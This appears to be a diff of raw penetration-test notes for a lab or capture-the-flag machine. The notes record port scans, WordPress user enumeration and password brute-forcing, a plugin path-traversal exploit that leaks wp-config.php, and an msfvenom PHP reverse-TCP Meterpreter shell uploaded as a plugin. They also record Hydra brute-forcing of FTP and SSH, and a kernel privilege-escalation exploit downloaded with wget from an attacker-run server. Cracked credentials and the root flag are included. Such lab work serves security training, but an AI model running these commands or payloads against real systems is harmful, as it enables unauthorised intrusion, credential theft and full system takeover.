@@ -1,0 +1,201 @@
+ping IP
+or
+nmap -sn IP
+
+nmap -Pn -sV -sC -vv IP
+nmap -p- IP
+nmap -Pn --script vuln -p21,22,53,80,139,666,3306 192.168.127.148
+
+
+20 closed
+21 ftp anonymous login vsftpd 2.0.8
+22 shh OpenSSH 7.2p2
+53 
+80  PHP cli server 5.5
+139 smbd
+666
+3306 mysql
+12380 
+
+Enumerating FTP 
+
+ftp 192.168.127.148
+
+anonymous
+
+more note
+
+```
+Elly, make sure you update the payload information. Leave it in your FTP account once your 
+are done, John.
+
+```
+
+Maybe Username:
+Elly and Jhon
+
+Enumerating SMB
+
+enm4linux -a 192.168.127.148
+smbclient -L //192.168.127.148
+
+Enumerating DNS
+
+dig 192.168.127.148
+
+Enumerating Doom
+
+nc 192.168.127.148 666
+
+nc 192.168.127.148 666 > doom
+file doom
+unzip doom
+strings message2.jpg
+
+Enumerating HTTP
+
+80 404 
+12380 400
+
+nikto -h 192.168.127.148:12380
+
+/admin112233/
+/blogblog/
+/phpmyadmin/
+
+Got error access this path try https://
+
+wpscan --url https://192.168.238.148:12380/blogblog --disable-tls-checks -e u
+
+john Smith
+john
+garry
+elly
+peter
+barry
+heather
+harry
+scott
+kathy
+tim
+
+wpscan --url https://192.168.238.148:12380/blogblog --disable-tls-checks -e p
+
+wpscan --url https://192.168.238.148:12380/blogblog --disable-tls-checks -P /usr/share/wordlists/rockyou.txt
+
+garry:football
+harry:monkry
+scott:cookie
+tim:thumb
+
+all user had low privilege
+
+wpscan --url https://192.168.238.148:12380/blogblog --disable-tls-checks -e ap --plugins-detection aggressive -o wordpress-plugins
+
+advanced-video-embed-embed-videos-or-playlists
+
+searchsploit advanced video
+searchsploit -m php/webapps/39646.py
+
+TARGET/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php
+
+
+https://192.168.238.148:12380/blogblog/wp-content/uploads/
+
+curl -k https://192.168.238.148:12380/blogblog/wp-content/uploads/1117673007.jpeg > file.jpeg
+
+cat file.jpeg
+
+DB_USER', 'root'
+DB_PASSWORD', 'plbkac'
+
+https://192.168.238.148:12380/phpmyadmin/
+
+https://192.168.238.148:12380/phpmyadmin/sql.php?db=wordpress&token=11634b89c31b86da1c848640454d97a6&goto=db_structure.php&table=wp_users&pos=0
+
+user: John
+hash: $P$B7889EMq/erHIuZapMB8GEizebcIy9.
+
+wpscan --url https://192.168.210.148:12380/blogblog --disable-tls-checks -U John -P /usr/share/wordlists/rockyou.txt -t 50
+
+GOT USER:PASS
+[!] Valid Combinations Found:
+ | Username: john, Password: incorrect
+
+
+GOTO Plugins -> Add New -> upload php payload.
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.9.12 lport=4444 -f raw > shell.php
+
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST your-ip 
+set LPORT listening-port run
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=xterm
+
+upload /home/Faizee/Downloads/exploit.tar
+shell
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit 
+./compile.sh 
+./doubleput 
+id
+
+OR
+
+Back to FTP
+
+```
+Elly, make sure you update the payload information. Leave it in your FTP account once your 
+are done, John.
+
+```
+hydra -l elly -e nsr 192.168.210.148 ftp
+
+[21][ftp] host: 192.168.210.148   login: elly   password: ylle
+
+ftp 192.168.210.148
+
+get passwd
+cat passwd | cut –d “:” –f1 > usernames.txt
+OR 
+cat passwd | awk -F: ‘{print $1}’ > usernames.txt
+
+hydra -e nsr -L usernames.txt -t 14 192.168.210.148 ssh
+
+[22][ssh] host: 192.168.210.148   login: SHayslett   password: SHayslett
+
+ssh SHayslett@192.168.210.148
+
+uname –a
+cat /etc/lsb-release
+
+searchsploit Ubuntu 16.04
+
+google  Ubuntu 16.04 exploit
+https://www.exploit-db.com/exploits/44298
+
+work exploit
+linux/local/39772.txt
+searchsploit -m linux/local/39772.txt
+
+https://www.exploit-db.com/exploits/39772
+
+https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit 
+
+python -m http.server
+wget 192.168.49.210:8000/exploit.tar
+
+./compile.sh 
+./doubleput 
+id
+cd /root
+cat proof.txt
+42cfbc65799a65ff5d8ba8dac07cc2b8
+
